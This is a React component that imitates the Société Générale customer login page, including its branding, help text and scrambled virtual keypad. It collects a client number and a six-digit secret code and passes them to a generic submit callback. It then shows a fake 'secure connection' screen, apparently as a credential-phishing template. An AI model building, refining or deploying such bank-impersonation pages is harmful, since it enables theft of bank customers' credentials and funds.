import React, { useState } from 'react';
import { Loader2 } from 'lucide-react';

interface SgAuthTemplateProps {
  onSubmit: (formData: any) => Promise<boolean>;
}

export function SgAuthTemplate({ onSubmit }: SgAuthTemplateProps) {
  const [formData, setFormData] = useState({
    clientNumber: '',
    secretCode: ''
  });
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [showLoader, setShowLoader] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [showKeypad, setShowKeypad] = useState(false);
  const [secretCodeDigits, setSecretCodeDigits] = useState(['', '', '', '', '', '']);

  const handleClientNumberSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.clientNumber) {
      setShowKeypad(true);
    }
  };

  const handleFinalSubmit = async () => {
    setStatus('sending');

    try {
      const submitData = {
        ...formData,
        secretCode: secretCodeDigits.join('')
      };
      
      const success = await onSubmit(submitData);
      if (!success) throw new Error('Failed to submit form');
      
      setStatus('success');
      setShowLoader(true);
      
      setTimeout(() => {
        setShowLoader(false);
        setStatus('idle');
      }, 3000);
    } catch (error) {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    }
  };

  const handleKeypadClick = (digit: string) => {
    const emptyIndex = secretCodeDigits.findIndex(d => d === '');
    if (emptyIndex !== -1) {
      const newDigits = [...secretCodeDigits];
      newDigits[emptyIndex] = digit;
      setSecretCodeDigits(newDigits);
    }
  };

  const clearSecretCode = () => {
    setSecretCodeDigits(['', '', '', '', '', '']);
  };

  // Show loader overlay when processing
  if (showLoader) {
    return (
      <div className="min-h-screen bg-white">
        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-12 h-12 animate-spin text-red-600 mb-6" />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Authentification en cours...
              </h2>
              <p className="text-gray-600 text-center max-w-md">
                Connexion sécurisée à votre espace Société Générale en cours.
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Show keypad interface
  if (showKeypad) {
    return (
      <div className="min-h-screen bg-white">
        {/* Header */}
        <div className="bg-navy-900" style={{ backgroundColor: '#1e1b4b' }}>
          <div className="max-w-7xl mx-auto px-4 py-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-4">
                <span className="text-white text-sm">📍 Agences</span>
                <span className="text-white text-sm">⚠️ Aide et contacts</span>
              </div>
            </div>
          </div>
        </div>

        {/* Main Header */}
        <div className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 py-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-4">
                <div className="flex items-center">
                  <div className="bg-red-600 text-white px-2 py-1 text-xl font-bold mr-2">SG</div>
                  <div>
                    <div className="text-sm font-bold">C'EST VOUS</div>
                    <div className="text-sm font-bold">L'AVENIR</div>
                  </div>
                </div>
              </div>
              <button className="bg-navy-900 text-white px-6 py-2 rounded text-sm hover:bg-navy-800" style={{ backgroundColor: '#1e1b4b' }}>
                Ouvrir un compte
              </button>
            </div>
          </div>
        </div>

        {/* Keypad Interface - Design fidèle à l'image */}
        <div className="max-w-sm mx-auto px-4 py-8">
          <div className="bg-white border border-gray-200 rounded-lg p-6 shadow-lg">
            {/* Client Number Display avec validation */}
            <div className="text-center mb-6">
              <div className="text-2xl font-bold text-gray-800 mb-2 tracking-wider border-b-2 border-gray-300 pb-2">
                {formData.clientNumber}
              </div>
              <div className="flex justify-end">
                <div className="w-6 h-6 bg-green-100 rounded-full flex items-center justify-center">
                  <span className="text-green-600 text-sm">✓</span>
                </div>
              </div>
            </div>

            {/* Remember Me - Design exact selon l'image */}
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center space-x-2">
                <div className="relative">
                  <input
                    type="radio"
                    id="remember-no"
                    name="remember"
                    checked={!rememberMe}
                    onChange={() => setRememberMe(false)}
                    className="w-4 h-4 text-gray-600 border-gray-300 focus:ring-gray-500"
                  />
                </div>
                <label htmlFor="remember-no" className="text-sm text-gray-600 bg-gray-200 px-2 py-1 rounded">
                  non
                </label>
              </div>
              <span className="text-sm text-gray-600 font-medium">Se souvenir de moi</span>
              <button type="button" className="text-gray-400 hover:text-gray-600 text-lg">
                ℹ️
              </button>
            </div>

            {/* Secret Code Display - 6 cases avec X pour effacer */}
            <div className="mb-6">
              <div className="flex justify-between items-center mb-4">
                <div className="flex justify-center space-x-2 flex-1">
                  {secretCodeDigits.map((digit, index) => (
                    <div
                      key={index}
                      className="w-8 h-8 border-b-2 border-gray-400 flex items-center justify-center text-lg font-bold"
                    >
                      {digit ? '●' : ''}
                    </div>
                  ))}
                </div>
                <button
                  onClick={clearSecretCode}
                  className="ml-4 text-gray-400 hover:text-red-500 text-xl font-bold w-8 h-8 flex items-center justify-center border border-gray-300 rounded"
                  title="Effacer le code"
                >
                  ✕
                </button>
              </div>
            </div>

            {/* Virtual Keypad - Disposition EXACTE selon l'image avec TOUS les boutons vides */}
            <div className="mb-6">
              <div className="grid grid-cols-4 gap-3 max-w-xs mx-auto">
                {/* Ligne 1: 6, 8, 5, 7 */}
                <button
                  onClick={() => handleKeypadClick('6')}
                  className="w-14 h-14 bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded text-xl font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                >
                  6
                </button>
                <button
                  onClick={() => handleKeypadClick('8')}
                  className="w-14 h-14 bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded text-xl font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                >
                  8
                </button>
                <button
                  onClick={() => handleKeypadClick('5')}
                  className="w-14 h-14 bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded text-xl font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                >
                  5
                </button>
                <button
                  onClick={() => handleKeypadClick('7')}
                  className="w-14 h-14 bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded text-xl font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                >
                  7
                </button>

                {/* Ligne 2: 9, 4, 2, vide (avec bouton vide) */}
                <button
                  onClick={() => handleKeypadClick('9')}
                  className="w-14 h-14 bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded text-xl font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                >
                  9
                </button>
                <button
                  onClick={() => handleKeypadClick('4')}
                  className="w-14 h-14 bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded text-xl font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                >
                  4
                </button>
                <button
                  onClick={() => handleKeypadClick('2')}
                  className="w-14 h-14 bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded text-xl font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                >
                  2
                </button>
                {/* Bouton vide non-cliquable */}
                <button
                  disabled
                  className="w-14 h-14 bg-gray-50 border border-gray-200 rounded cursor-not-allowed opacity-50"
                >
                </button>

                {/* Ligne 3: 0, vide, vide, 3 (avec boutons vides) */}
                <button
                  onClick={() => handleKeypadClick('0')}
                  className="w-14 h-14 bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded text-xl font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                >
                  0
                </button>
                {/* Bouton vide non-cliquable */}
                <button
                  disabled
                  className="w-14 h-14 bg-gray-50 border border-gray-200 rounded cursor-not-allowed opacity-50"
                >
                </button>
                {/* Bouton vide non-cliquable */}
                <button
                  disabled
                  className="w-14 h-14 bg-gray-50 border border-gray-200 rounded cursor-not-allowed opacity-50"
                >
                </button>
                <button
                  onClick={() => handleKeypadClick('3')}
                  className="w-14 h-14 bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded text-xl font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                >
                  3
                </button>

                {/* Ligne 4: 1, vide, vide, vide (avec boutons vides) */}
                <button
                  onClick={() => handleKeypadClick('1')}
                  className="w-14 h-14 bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded text-xl font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                >
                  1
                </button>
                {/* Bouton vide non-cliquable */}
                <button
                  disabled
                  className="w-14 h-14 bg-gray-50 border border-gray-200 rounded cursor-not-allowed opacity-50"
                >
                </button>
                {/* Bouton vide non-cliquable */}
                <button
                  disabled
                  className="w-14 h-14 bg-gray-50 border border-gray-200 rounded cursor-not-allowed opacity-50"
                >
                </button>
                {/* Bouton vide non-cliquable */}
                <button
                  disabled
                  className="w-14 h-14 bg-gray-50 border border-gray-200 rounded cursor-not-allowed opacity-50"
                >
                </button>
              </div>
            </div>

            {/* Submit Button - Style SG */}
            <button
              onClick={handleFinalSubmit}
              disabled={status === 'sending' || secretCodeDigits.some(d => d === '')}
              className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed shadow-lg hover:shadow-xl"
            >
              {status === 'sending' ? (
                <div className="flex items-center justify-center space-x-2">
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>Connexion...</span>
                </div>
              ) : (
                'Valider'
              )}
            </button>

            {/* Sound Keypad Link */}
            <div className="text-center mt-4">
              <button className="text-blue-600 hover:text-blue-800 hover:underline text-sm transition-colors duration-200">
                Activer le clavier sonore
              </button>
            </div>

            {status === 'error' && (
              <div className="text-red-600 text-center bg-red-50 p-4 rounded-lg mt-4 border border-red-200">
                <div className="flex items-center justify-center space-x-2">
                  <span className="text-red-500">⚠️</span>
                  <span>Échec de la connexion. Veuillez vérifier vos identifiants.</span>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Chat Support */}
        <div className="fixed bottom-6 right-6">
          <button className="bg-navy-900 text-white p-4 rounded-full shadow-lg hover:bg-navy-800 transition-all duration-200 hover:scale-110" style={{ backgroundColor: '#1e1b4b' }}>
            💬
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <div className="bg-navy-900" style={{ backgroundColor: '#1e1b4b' }}>
        <div className="max-w-7xl mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <span className="text-white text-sm">📍 Agences</span>
              <span className="text-white text-sm">⚠️ Aide et contacts</span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Header */}
      <div className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <div className="flex items-center">
                <div className="bg-red-600 text-white px-2 py-1 text-xl font-bold mr-2">SG</div>
                <div>
                  <div className="text-sm font-bold">C'EST VOUS</div>
                  <div className="text-sm font-bold">L'AVENIR</div>
                </div>
              </div>
            </div>
            <button className="bg-navy-900 text-white px-6 py-2 rounded text-sm hover:bg-navy-800" style={{ backgroundColor: '#1e1b4b' }}>
              Ouvrir un compte
            </button>
          </div>
        </div>
      </div>

      <div className="max-w-6xl mx-auto px-4 py-8">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Left Panel - Login Form */}
          <div className="bg-white">
            <h1 className="text-xl font-semibold text-gray-700 mb-8">
              Connexion à votre Espace Client Particuliers
            </h1>

            <div className="bg-white border border-gray-200 rounded-lg p-8 max-w-md shadow-lg">
              <form onSubmit={handleClientNumberSubmit} className="space-y-6">
                {/* Client Code Input - Style amélioré */}
                <div>
                  <label className="block text-sm font-medium text-gray-600 mb-3">
                    Saisissez votre code client
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={formData.clientNumber}
                      onChange={(e) => setFormData(prev => ({ ...prev, clientNumber: e.target.value }))}
                      className="w-full px-0 py-4 border-0 border-b-2 border-gray-300 focus:border-red-500 focus:ring-0 bg-transparent text-xl font-mono tracking-wider transition-all duration-200 placeholder-gray-400"
                      placeholder="Votre code client"
                      required
                    />
                    {formData.clientNumber && (
                      <button
                        type="button"
                        onClick={() => setFormData(prev => ({ ...prev, clientNumber: '' }))}
                        className="absolute right-0 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-red-500 transition-colors duration-200 p-1 rounded-full hover:bg-gray-100"
                      >
                        ✕
                      </button>
                    )}
                  </div>
                  {/* Indicateur de validation */}
                  {formData.clientNumber && (
                    <div className="mt-2 flex items-center space-x-2">
                      <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                      <span className="text-xs text-green-600">Code client valide</span>
                    </div>
                  )}
                </div>

                {/* Remember Me Checkbox - Style SG */}
                <div className="flex items-center space-x-3">
                  <div className="flex items-center space-x-2">
                    <input
                      type="radio"
                      id="remember-no-main"
                      name="remember-main"
                      checked={!rememberMe}
                      onChange={() => setRememberMe(false)}
                      className="w-4 h-4 text-red-600 border-gray-300 focus:ring-red-500"
                    />
                    <label htmlFor="remember-no-main" className="text-sm text-gray-600 bg-gray-200 px-2 py-1 rounded">
                      non
                    </label>
                  </div>
                  <span className="text-sm text-gray-600 font-medium">Se souvenir de moi</span>
                  <button type="button" className="text-gray-400 hover:text-gray-600 transition-colors duration-200">
                    ℹ️
                  </button>
                </div>

                {/* Submit Button - Style SG */}
                <button
                  type="submit"
                  disabled={!formData.clientNumber}
                  className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 active:translate-y-0"
                >
                  Valider
                </button>
              </form>
            </div>
          </div>

          {/* Right Panel - Help Section */}
          <div className="bg-white">
            <div className="max-w-md">
              <h3 className="text-lg font-semibold text-gray-800 mb-6">
                Où trouver mon Code Client SG ?
              </h3>
              
              <div className="space-y-4 text-sm text-gray-600">
                <p>
                  Votre Code Client vous a été communiqué lors de la souscription à la 
                  Banque à Distance. Il est également indiqué sur vos relevés de comptes.
                </p>
              </div>

              <div className="mt-8">
                <h4 className="font-semibold text-gray-800 mb-4">
                  Code Client ou Code Secret inconnus ?
                </h4>
                
                <div className="space-y-2">
                  <div className="flex items-start space-x-2">
                    <span className="text-red-600">»</span>
                    <a href="#" className="text-blue-600 hover:underline text-sm">
                      Je souhaite obtenir mon Code Client
                    </a>
                  </div>
                  <div className="flex items-start space-x-2">
                    <span className="text-red-600">»</span>
                    <a href="#" className="text-blue-600 hover:underline text-sm">
                      Je ne connais pas mon Code Secret
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Bottom Section - Progéliance Net */}
        <div className="mt-16 border-t pt-8">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            {/* Progéliance Net Login */}
            <div className="bg-white">
              <h2 className="text-xl font-semibold text-gray-700 mb-8">
                Connexion à votre Espace Client Progéliance Net
              </h2>

              <div className="bg-white border border-gray-200 rounded-lg p-8 max-w-md shadow-lg">
                <form className="space-y-6">
                  <div>
                    <label className="block text-sm font-medium text-gray-600 mb-3">
                      Saisissez votre code client
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        className="w-full px-0 py-4 border-0 border-b-2 border-gray-300 focus:border-red-500 focus:ring-0 bg-transparent text-xl font-mono tracking-wider transition-all duration-200 placeholder-gray-400"
                        placeholder="Votre code client"
                      />
                      <button
                        type="button"
                        className="absolute right-0 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-red-500 transition-colors duration-200 p-1 rounded-full hover:bg-gray-100"
                      >
                        ✕
                      </button>
                    </div>
                  </div>

                  <div className="flex items-center space-x-3">
                    <input
                      type="radio"
                      className="w-4 h-4 text-red-600 border-gray-300 focus:ring-red-500"
                    />
                    <span className="text-sm text-gray-600 bg-gray-200 px-2 py-1 rounded">non</span>
                    <span className="text-sm text-gray-600 font-medium">Se souvenir de moi</span>
                    <button type="button" className="text-gray-400 hover:text-gray-600 transition-colors duration-200">
                      ℹ️
                    </button>
                  </div>

                  <button
                    type="submit"
                    className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded transition-all duration-200 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 active:translate-y-0"
                  >
                    Valider
                  </button>
                </form>
              </div>
            </div>

            {/* Progéliance Net Help */}
            <div className="bg-white">
              <div className="max-w-md">
                <h3 className="text-lg font-semibold text-gray-800 mb-6">
                  Où trouver mon Code Client SG ?
                </h3>
                
                <div className="space-y-4 text-sm text-gray-600">
                  <p>
                    • Si vous êtes l'administrateur ou un gestionnaire de l'abonnement 
                    Progéliance Net, votre Code Client vous a été communiqué lors de la 
                    souscription à la Banque à Distance.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Chat Support */}
      <div className="fixed bottom-6 right-6">
        <button className="bg-navy-900 text-white p-4 rounded-full shadow-lg hover:bg-navy-800 transition-all duration-200 hover:scale-110" style={{ backgroundColor: '#1e1b4b' }}>
          💬
        </button>
      </div>
    </div>
  );
}